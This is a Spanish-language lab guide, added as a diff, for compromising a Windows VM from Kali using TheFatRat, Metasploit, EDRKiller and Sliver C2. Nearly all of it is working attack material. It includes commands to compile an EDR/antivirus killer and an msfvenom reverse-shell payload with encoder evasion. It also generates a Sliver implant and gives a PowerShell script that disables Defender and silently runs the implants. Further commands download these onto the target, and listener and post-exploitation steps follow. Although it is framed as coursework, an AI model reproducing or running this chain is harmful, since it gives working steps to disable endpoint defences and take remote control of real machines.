+  CAP 4:  msfvenom generando payload   (Creación del .exe)
+  CAP 5:  ls -lh ~/payloads/           (Payload generado)
+  CAP 6:  python3 -m http.server 8000  (Servidor HTTP corriendo)
+  CAP 7:  msfconsole listener          (Metasploit escuchando)
+  CAP 8:  sysinfo                      (Info de Windows Bokul)
+  CAP 9:  getuid                       (Usuario: IYJ\bokul)
+  CAP 10: screenshot                   (Captura escritorio víctima)
+
+  En WINDOWS BOKUL (8 capturas):
+  ───────────────────────────────
+  CAP 11: ipconfig                     (IP: 192.168.163.130)
+  CAP 12: ping -n 4 192.168.163.129   (Conexión con Kali)
+  CAP 13: Get-MpPreference            (Defender desactivado)
+  CAP 14: Get-NetFirewallRule         (Firewall configurado)
+  CAP 15: Get-ChildItem C:\payloads\  (Payload descargado)
+  CAP 16: C:\payloads\payload.exe     (Ejecutando payload)
+  CAP 17: netstat -an | findstr 4444  (Conexión activa)
+  CAP 18: whoami / ipconfig           (Shell interactiva desde Kali)
+
+====================================================================
+  SECCION EXTRA: MEGA-COMBO (EDRKILLER + SLIVER + THEFATRAT + MSF)
+===================================================================
+
+  ¿Qué es EDRKiller?
+  ──────────────────
+  EDRKiller es una herramienta que desactiva/mata procesos de
+  Endpoint Detection and Response (EDR) y Antivirus en Windows.
+  Ejecutarlo ANTES del payload permite que el malware pase sin ser
+  detectado, incluso con EDRs avanzados como CrowdStrike, SentinelOne,
+  Carbon Black, o Windows Defender.
+
+  ¿Qué es Sliver?
+  ───────────────
+  Sliver es un Framework C2 (Command & Control) moderno de BishopFox.
+  Es la alternativa a Metasploit/Meterpreter pero más evasivo y difícil
+  de detectar. Ofrece:
+    - Implants (payloads) ofuscados nativamente
+    - Comunicación encriptada (mutual TLS)
+    - Soporte para DNS, HTTP, HTTPS, Mutual TLS
+    - Stage listeners
+    - Menos firmas AV que Meterpreter
+
+  ¿Por qué combinarlos?
+  ─────────────────────
+  EDRKiller  → Mata AV/EDR en Windows Bokul
+  Sliver     → Implant persistente y evasivo (C2 moderno)
+  TheFatRat  → Payloads variados (MSFvenom wrapper)
+  Metasploit → Post-explotación clásica (sysinfo, screenshot, shell)
+
+
+  12.1  Instalar EDRKiller en Kali
+  ────────────────────────────────
+  Comando:
+    cd /opt
+    git clone --depth=1 https://github.com/nadeemamin/EDRKiller.git
+    cd EDRKiller
+    x86_64-w64-mingw32-gcc -o EDRKiller.exe edrkiller.c -lntdll -O2
+
+  Explicación:
+    Clona el repositorio de EDRKiller y lo compila para Windows.
+    El resultado es EDRKiller.exe que se ejecuta en Windows Bokul
+    para matar procesos de EDR/AV.
+
+  Si la compilación falla:
+    sudo apt install -y mingw-w64
+    O descarga el binario precompilado desde releases de GitHub.
+
+
+  12.2  Instalar Sliver C2 en Kali
+  ─────────────────────────────────
+  Comando:
+    curl -sL https://sliver.sh/install | bash
+
+  Explicación:
+    Descarga e instala Sliver Server + Sliver Client automáticamente.
+    Sliver Server corre en Kali escuchando conexiones.
+    Sliver Client es la consola para controlar los implants.
+
+  Instalación manual (si curl falla):
+    cd /opt
+    wget "https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux.zip"
+    unzip -o sliver-server_linux.zip -d sliver
+    chmod +x sliver/sliver-server sliver/sliver-client
+    ln -sf /opt/sliver/sliver-server /usr/local/bin/sliver-server
+    ln -sf /opt/sliver/sliver-client /usr/local/bin/sliver
+
+
+  12.3  Iniciar Sliver Server
+  ────────────────────────────
+  Comando:
+    sliver-server daemon --lhost 192.168.163.129 --lport 8443
+
+  Explicación:
+    Inicia el servidor Sliver escuchando en el puerto 8443.
+    --daemon: Corre en segundo plano.
+    --lhost: IP de Kali (donde los implants se conectarán).
+    --lport: Puerto para la comunicación C2.
+
+
+  12.4  Generar implant de Sliver
+  ────────────────────────────────
+  Comando (dentro de sliver-client):
+    # Abrir Sliver Client
+    sliver-client
+
+    # Crear operador (primera vez)
+    new operator --name profesor --lhost 127.0.0.1 --save /tmp/profesor.cfg
+
+    # Conectarse al servidor
+    import /tmp/profesor.cfg
+    connect 127.0.0.1:31337
+
+    # Generar implant HTTP
+    generate --http 192.168.163.129 --save /root/payloads/sliver_implant.exe
+
+    # Salir
+    exit
+
+  Explicación:
+    Sliver genera un implant (payload) que se conecta a Kali por HTTP.
+    --http: El implant usará HTTP para comunicarse (más sigiloso).
+    --save: Dónde guardar el archivo generado.
+
+  Alternativa: Implant HTTPS (más seguro):
+    generate --https 192.168.163.129 --save /root/payloads/sliver_https.exe
+
+
+  12.5  Mega-Combo: Unir EDRKiller + Payloads en un solo script
+  ──────────────────────────────────────────────────────────────
+  Este paso crea un archivo ejecutable.ps1 que hace TODO en Windows Bokul:
+    1. Desactiva Defender
+    2. Ejecuta EDRKiller (mata EDR/AV)
+    3. Ejecuta payload de Metasploit
+    4. Ejecuta implant de Sliver
+    5. Muestra las conexiones activas
+
+  Comando (Kali):
+    cat > /root/payloads/MEGA-EJECUTAR.ps1 << 'PS1'
+    # Laboratorio Ciberseguridad - MEGA COMBO
+    # EJECUTAR: PowerShell -ExecutionPolicy Bypass -File MEGA-EJECUTAR.ps1
+    Write-Host "[1/5] Desactivando Defender..." -ForegroundColor Yellow
+    Set-MpPreference -DisableRealtimeMonitoring $true
+    Set-MpPreference -DisableBehaviorMonitoring $true
+    Set-MpPreference -DisableBlockAtFirstSeen $true
+    Set-MpPreference -DisableIOAVProtection $true
+
+    Write-Host "[2/5] Ejecutando EDRKiller..." -ForegroundColor Yellow
+    if (Test-Path "EDRKiller.exe") {
+        Start-Process -FilePath "EDRKiller.exe" -ArgumentList "-force" -Wait -WindowStyle Hidden
+    }
+
+    Write-Host "[3/5] Ejecutando payload Metasploit..." -ForegroundColor Yellow
+    if (Test-Path "payload_msf.exe") {
+        Start-Process -FilePath "payload_msf.exe" -WindowStyle Hidden
+    }
+
+    Write-Host "[4/5] Ejecutando implant Sliver..." -ForegroundColor Yellow
+    if (Test-Path "sliver_implant.exe") {
+        Start-Process -FilePath "sliver_implant.exe" -WindowStyle Hidden
+    }
+
+    Write-Host "[5/5] Conexiones activas:" -ForegroundColor Yellow
+    netstat -an | findstr "4444 8443"
+    PS1
+
+    chmod +x /root/payloads/MEGA-EJECUTAR.ps1
+
+
+  12.6  Iniciar TODO desde Kali (servidores + listener)
+  ──────────────────────────────────────────────────────
+  Comando (ABRIR 3 TERMINALES EN KALI):
+
+  Terminal 1 - Servidor HTTP (compartir archivos):
+    cd /root/payloads
+    python3 -m http.server 8000
+
+  Terminal 2 - Listener Metasploit:
+    msfconsole -q -x 'use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; set ExitOnSession false; exploit -j -z'
+
+  Terminal 3 - Sliver Client (monitorear implants):
+    sliver-client
+    # Dentro de Sliver:
+    watch
+
+
+  12.7  Ejecutar en Windows Bokul (1 solo comando)
+  ──────────────────────────────────────────────────
+  PowerShell ADMIN en Windows Bokul:
+
+    # Descargar el script MEGA:
+    Set-MpPreference -DisableRealtimeMonitoring $true
+    mkdir C:\mega -Force
+    Invoke-WebRequest -Uri "http://192.168.163.129:8000/MEGA-EJECUTAR.ps1" -OutFile "C:\mega\MEGA-EJECUTAR.ps1"
+    Invoke-WebRequest -Uri "http://192.168.163.129:8000/EDRKiller.exe" -OutFile "C:\mega\EDRKiller.exe"
+    Invoke-WebRequest -Uri "http://192.168.163.129:8000/payload_msf.exe" -OutFile "C:\mega\payload_msf.exe"
+    Invoke-WebRequest -Uri "http://192.168.163.129:8000/sliver_implant.exe" -OutFile "C:\mega\sliver_implant.exe"
+
+    # Ejecutar TODO:
+    cd C:\mega
+    PowerShell -ExecutionPolicy Bypass -File MEGA-EJECUTAR.ps1
+
+
+  12.8  Ver las sesiones en Kali
+  ───────────────────────────────
+
+  En Metasploit (Terminal 2) verás:
+    [*] Meterpreter session 1 opened (192.168.163.129:4444 -> 192.168.163.130:49175)
+
+  Interactuar:
+    sessions -i 1
+    sysinfo
+    getuid
+    screenshot
+    shell
+
+  En Sliver (Terminal 3) verás:
+    [*] Session #1 - IYJ - 192.168.163.130:49180 (WIN-IMPLANT)
+
+  Interactuar:
+    use 1
+    info
+    screenshot
+    shell
+
+
+  12.9  Flujo completo del Mega-Combo (para el profesor)
+  ──────────────────────────────────────────────────────
+
+  ╔═══════════════════════════════════════════════════════════════╗
+  ║  FLUJO DEL ATAQUE COMBINADO                                  ║
+  ╚═══════════════════════════════════════════════════════════════╝
+
+  1. KALI: Instalar herramientas
+     sudo apt install -y metasploit-framework golang-go mingw-w64
+     curl -sL https://sliver.sh/install | bash
+     git clone https://github.com/nadeemamin/EDRKiller.git
+
+  2. KALI: Compilar EDRKiller
+     cd /opt/EDRKiller
+     x86_64-w64-mingw32-gcc -o EDRKiller.exe edrkiller.c -lntdll -O2
+
+  3. KALI: Generar payloads
+     # MSFvenom (TheFatRat)
+     msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.163.129 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o payload_msf.exe
+
+     # Sliver
+     sliver-server daemon --lhost 192.168.163.129 --lport 8443 &
+     sliver-client
+     generate --http 192.168.163.129 --save /root/payloads/sliver_implant.exe
+
+  4. KALI: Iniciar servidores
+     Terminal 1: python3 -m http.server 8000 &
+     Terminal 2: msfconsole -q -r /tmp/listener.rc &
+     Terminal 3: sliver-client
+
+  5. WINDOWS: Descargar todo desde http://192.168.163.129:8000/
+     EDRKiller.exe
+     payload_msf.exe
+     sliver_implant.exe
+
+  6. WINDOWS: Ejecutar EDRKiller.exe (mata AV/EDR)
+  7. WINDOWS: Ejecutar payload_msf.exe (sesión Metasploit)
+  8. WINDOWS: Ejecutar sliver_implant.exe (sesión Sliver C2)
+  9. KALI: Ver sesiones en Metasploit y Sliver
+  10. KALI: sysinfo, getuid, screenshot, shell
+
+
+  12.10  EDRKiller + Sliver: Ventajas sobre solo TheFatRat/MSF
+  ──────────────────────────────────────────────────────────────
+
+  ┌────────────────────┬────────────────────┬────────────────────┐
+  │ Característica      │ Solo TheFatRat/MSF │ Mega-Combo         │
+  ├────────────────────┼────────────────────┼────────────────────┤
+  │ Evasión AV          │ Básica (shikata)   │ EDRKiller mata AV  │
+  │ Evasión EDR         │ No                  │ EDRKiller mata EDR │
+  │ Persistencia        │ Manual              │ Sliver maneja      │
+  │ C2 moderno           │ Meterpreter (viejo) │ Sliver (moderno)   │
+  │ Encriptación        │ TCP plano           │ mTLS/HTTP/S       │
+  │ Firmas conocidas    │ Muchas (años)       │ Pocas (nuevo)      │
+  │ Control remoto      │ Metasploit          │ Sliver + MSF      │
+  │ Redundancia         │ 1 payload           │ 2 payloads         │
+  └────────────────────┴────────────────────┴────────────────────┘
+
+
+===================================================================
+  RESUMEN DE CAPTURAS PARA EL INFORME (MEGA-COMBO)
+===================================================================
+
+  KALI ITMAR (10 capturas adicionales):
+  ─────────────────────────────────────
+  MEGA-1:  Compilación de EDRKiller
+  MEGA-2:  Instalación de Sliver
+  MEGA-3:  Sliver generate --http (implant creado)
+  MEGA-4:  Sliver server escuchando
+  MEGA-5:  3 terminales abiertas (HTTP, MSF, Sliver)
+  MEGA-6:  Metasploit session opened
+  MEGA-7:  sysinfo de Windows Bokul
+  MEGA-8:  Sliver session activa
+  MEGA-9:  info del implant en Sliver
+  MEGA-10: screenshot desde Sliver
+
+  WINDOWS BOKUL (4 capturas adicionales):
+  ───────────────────────────────────────
+  MEGA-11: Archivos descargados (EDRKiller + 2 payloads)
+  MEGA-12: EDRKiller ejecutándose
+  MEGA-13: MEGA-EJECUTAR.ps1 corriendo
+  MEGA-14: netstat mostrando 2 conexiones (4444 MSF + 8443 Sliver)
+
+
+===================================================================
+  FIN DE LA GUIA COMPLETA
+  TheFatRat + Metasploit + EDRKiller + Sliver C2
+  Laboratorio completado: Kali Itmar comprometió Windows Bokul
+  Fecha: Junio 2026
+====================================================================
